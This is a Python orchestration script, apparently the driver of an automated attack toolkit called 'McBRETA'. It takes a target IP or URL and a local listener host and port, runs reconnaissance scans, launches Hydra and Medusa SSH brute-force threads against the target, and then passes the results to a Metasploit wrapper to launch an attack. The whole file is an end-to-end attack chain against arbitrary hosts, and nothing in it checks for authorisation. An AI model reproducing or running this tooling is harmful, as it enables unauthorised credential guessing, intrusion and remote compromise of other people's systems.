# LOCAL
from File_man import File_Man

# TESTING
from brute_ssh import BruteSSH
from net_map import NetMap
from micro_scans import MicroScans
from meta_fab import MetaFab

# SYS_BASE
import sys
import threading

class TestCase_0():
    def __init__(self, **kw):
        super(TestCase_0, self).__init__(**kw)
        self.FM         = File_Man()
        self.BSS         = BruteSSH()
        self.NM         = NetMap()
        self.MS         = MicroScans()
        self.META       = MetaFab()


    # ! BUILD PROFILE
    def make_profile(self, tar_type, tar_val, port_):
        try:
            prof_ = "profiles_/"

            print(f"[TAR_TYPE]:[>{str(tar_type)}<]")
            print(f"[TAR_VAL]:[>{str(tar_val)}<]")


            to_save_ = f"[TAR_TYPE]:[>{str(tar_type)}<]\n[TAR_VAL]:[>{str(tar_val)}<]"
            if port_:
                print(f"[Re_PORT]:[>{str(port_)}<]")
                to_save_ = f"[TAR_TYPE]:[>{str(tar_type)}<]\n[TAR_VAL]:[>{str(tar_val)}<]\n[Re_PORT]:[>{str(port_)}<]"

            file_dir = ""
            if "http://" in str(tar_val):
                file_dir = tar_val.replace("https://", "")
                if "www." in str(file_dir):
                    file_dir = file_dir.replace("www.", "")
            elif tar_type == "IP":
                file_dir = tar_val.replace(".", "_")
            file_dir = tar_val.replace(".", "_")
            print(f"[MAIN_FILE_DIR]:[>{str(file_dir)}<]")
            make_dir = prof_+file_dir
            print(f"[DIR_TO_MAKE]:[{make_dir}]")
            save_at = prof_+file_dir+"/profile.csv"
            self.FM.make_dir(make_dir)
            self.FM.write_file(save_at, to_save_, "\n", "a+")
            return make_dir
        except Exception as e:
            print(f"[E]:[MAKING_PROFILE]:[>{str(e)}<]")
            return str(e)

    # ! LOW_GRADE_BRUTES
    def base_brutes(self, type_, target_, port_, file_dir):
        IP_ = ""
        try:
            IP_ = ""
            if type_ == "URL":
                print("[TYPE_URL]...\n[FETCHING_IP]...")
                # ! NS_LOOK_UP -> IP_
                IP_ = self.MS.dis_lookup(target_)
                print(f"[IP_FOUND]:[>{str(IP_)}<]")
                print(f"[STARTING_]:[BASE_BRUTES]")

            # INITS
            try:
                # @ BASE BRUTES
                # ! HYDRA
                self.hydra_ = threading.Thread(target=self.BSS.go_hydra, args=(IP_, file_dir, ))
                # !MEDUSA
                self.medusa_ = threading.Thread(target=self.BSS.go_medusa, args=(IP_, file_dir, ))
            except Exception as e:
                print(f"[E]:[BRUTE_TRHEADS]:[>{str(e)}<]")

            # RUN_THREADS
            try:
                print("[$]:[HYDRA]:[START]")
                self.hydra_.start()
                print("[$]:[MEDUSA]:[START]")
                self.medusa_.start()
            except Exception as e:
                print(f"[E]:[START_THREADS]:[>{str(e)}<]")
            print("[BRUTES_LAUNCHED]")
            return True
        except Exception as e:
            print(f"[E]:[BASE_BRUTES]:[>{str(e)}<]")
            return False

    # ! BASE SCANS
    # ! THREAD TO FINISH BEFORE NEXT ONE CAN START
    def start_scan(self, type_, target_, port_, file_dir):
        IP_ = ""
        try:
            IP_ = ""
            if type_ == "URL":
                print("[TYPE_URL]...\n[FETCHING_IP]...")
                # ! NS_LOOK_UP -> IP_
                IP_ = self.MS.dis_lookup(target_)
                print(f"[IP_FOUND]:[>{str(IP_)}<]")
                print(f"[STARTING_]:[MICRO_SCANS]:[&&]:[NET_MAP]")
            try:
                # @ BASE SCANNS
                # ! ALL_MICRO_SCANS
                self.MS.all_scans(type_, target_, file_dir)
                # ! NET_MAP_URL -> TCP_LIST
                tcp_ = self.NM.og_scan(type_, target_, file_dir, " ", port_)
                return tcp_
            except Exception as e:
                print(f"[E]:[STD_SCANS]:[>{str(e)}<]")
            print("[SCANS_COMPLETED]")

        except Exception as e:
            print(f"[E]:[START_SCAN]:[>{str(e)}<]")
            return ["ERROR", "OG_SCAN", "START_SCAN"]

    # ! META_SPLOIT_ATTACK
    def launch_att(self,l_host, l_port, target_, prof_dir, type_, tcp_):
        try:
            IP_ = self.MS.dis_lookup(target_)
            # ! META_SPLOIT
            self.META.set_meta_stack_(l_host, l_port, IP_, prof_dir, type_, tcp_)
            # ! WATCH_FILE ! TODO
            print("[McBRETA_RUN_COMPLETE]")
        except Exception as e:
            print(f"[E]:[McBRETA]:[MAIN]:[>{str(e)}<]")

    # ! MAIN
    def main(self):
        try:
            type_   = input("[TARGET_TYPE]\n[IP/URL]: ")
            target_ = input("[TAR_VAL]: ")
            port_  = input("[Re_PORT]: ")
            l_host = input("[L_HOST]: ")
            l_port = input("[L_PORT]: ")
            prof_dir = self.make_profile(type_, target_, port_)
            print("[TAR_DIR]:",str(prof_dir))
            if "ERROR" not in str(prof_dir):
                print("[STRATING..]")
                tcp_ =self.start_scan(type_, target_, port_, prof_dir)
                print("\n************\n[SCANS_COMPLETE]\n")
                self.launch_att(l_host, l_port, target_, prof_dir, type_, tcp_)
                print("[_McBRETA_COMPLETED]\n!*!")
            else:
                print(f"[E]:[SCAN_NOT_STARTED]")
        except Exception as e:
            print(f"[E]:[TEST_CASE]:[MAIN]:[>{str(e)}<]")
            return False



if __name__=="__main__":
    TC_0 = TestCase_0()
    TC_0.main()